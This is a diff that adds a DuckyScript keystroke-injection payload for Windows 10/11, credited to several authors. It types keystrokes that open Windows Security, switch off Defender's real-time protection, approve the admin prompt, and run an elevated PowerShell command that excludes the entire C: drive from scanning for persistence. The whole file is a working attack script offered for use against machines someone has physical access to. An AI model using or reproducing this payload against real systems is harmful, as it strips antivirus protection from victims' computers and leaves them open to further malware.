@@ -1,0 +1,60 @@
+REM Title: Disable Windows Defender
+REM Author: Zero_Sploit (v1.0)
+REM Updated: B33m0 (v1.1)
+REM Updated: UberGuidoZ (v1.2)
+REM Description: Opens security settings, disabled Defender, then adds an exception of drive C for persistence
+REM Target: Windows 10/11 (Powershell)
+REM Version: 1.2
+
+REM Pause for everything to recognize and be ready
+DELAY 2000
+
+REM Open Windows Defender Settings
+CTRL ESC
+DELAY 750
+STRING windows security
+DELAY 250
+ENTER
+DELAY 1000
+ENTER
+
+REM Navigate to Manage Settings
+DELAY 500
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+ENTER
+DELAY 500
+
+REM Open and turn off Realtime Protection
+SPACE
+DELAY 1000
+ALT y
+DELAY 1000
+
+REM Exit security settings
+ALT F4
+DELAY 500
+
+REM Open PowerShell
+GUI r
+DELAY 500
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT y
+DELAY 1000
+
+REM Exclude drive C from Defender
+STRING Add-MpPreference -ExclusionPath “C:”
+ENTER
+DELAY 2000
+
+REM Exit Powershell
+STRING EXIT
+ENTER
